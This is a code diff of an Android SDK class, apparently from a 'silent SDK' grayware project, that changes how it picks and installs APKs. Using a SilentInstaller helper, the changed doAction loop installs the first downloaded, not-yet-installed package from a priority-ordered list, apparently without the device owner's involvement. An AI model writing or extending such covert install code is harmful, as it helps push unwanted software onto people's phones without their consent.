@@ -3,6 +3,7 @@ package sdk.grayweb.com.slientsdk.action;
 import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
+import android.util.Log;
 
 import com.litesuits.common.assist.SilentInstaller;
 
@@ -16,6 +17,7 @@ import sdk.grayweb.com.slientsdk.http.HttpClient;
 import sdk.grayweb.com.slientsdk.http.TextHttpListener;
 import sdk.grayweb.com.slientsdk.model.ActionModel;
 import sdk.grayweb.com.slientsdk.model.ApkModel;
+import sdk.grayweb.com.slientsdk.util.DownLoadUtil;
 
 /**
  * Created by engine on 16/5/11.
@@ -28,23 +30,17 @@ public class InstallAction extends AbstractAction {
     @Override
     public int doAction() {
         try {
-            List<ApkModel> apkModels = apkModelDao.queryForAll();
+            List<ApkModel> apkModels = apkModelDao.queryBuilder().orderBy("level",false).query();
             ApkModel targetApk = null;
             for (int i = 0; i < apkModels.size(); i++) {
                 ApkModel model = apkModels.get(i);
                 if (!hasInstall(model.packagename)) {//没有安装
-                    List<ActionModel> list = actionDao.queryBuilder().where().eq("packageName",model.packagename).ge("type",2).query();
-                    if(list.size()==0){//没有安装过
-                        //安装这个apk
-                        installApk(targetApk.packagename, model.apkpath);
-                    }else {
-                        targetApk=model ;
+                    if(DownLoadUtil.hasDown(model.apkpath)) {
+                        targetApk = model;
+                        installApk(targetApk.packagename, DownLoadUtil.getFileNameByUrl(targetApk.apkpath));
+                        break;
                     }
                 }
-            }
-            //安装一个随便的APK
-            if (targetApk!=null) {
-                installApk(targetApk.packagename, targetApk.apkpath);
             }
 
         } catch (SQLException e) {
